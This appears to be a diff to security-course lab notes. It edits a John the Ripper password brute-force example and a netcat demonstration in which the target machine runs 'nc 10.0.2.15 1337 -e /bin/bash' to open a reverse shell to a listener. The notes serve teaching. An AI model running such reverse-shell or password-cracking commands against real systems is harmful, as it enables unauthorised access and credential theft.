@@ -55,7 +55,7 @@ Done
 ### Testing the Tools Presented in Class
 **Using John the Ripper to brute-force Kali's password database. Make things more interesting by changing your password with the passwd command.**  
 ```shell
-$ .\john.exe passwordfile –wordlist=”wordlist.txt # To generally brute force a passwordfile use
+$ .\john.exe passwordfile –wordlist=”wordlist.txt # To generally brute force a password file
 $ passwd berkankutuk # Changing password
 ```
 
@@ -99,7 +99,8 @@ Host machine ip: 10.0.2.15
 $ nc -lvp 1337 # Opening port
 ```
 
-'Compromised machine'
+now to the target machine
+
 ```shell
 $ nc 10.0.2.15 1337 -e /bin/bash # Connecting to the port
 ```
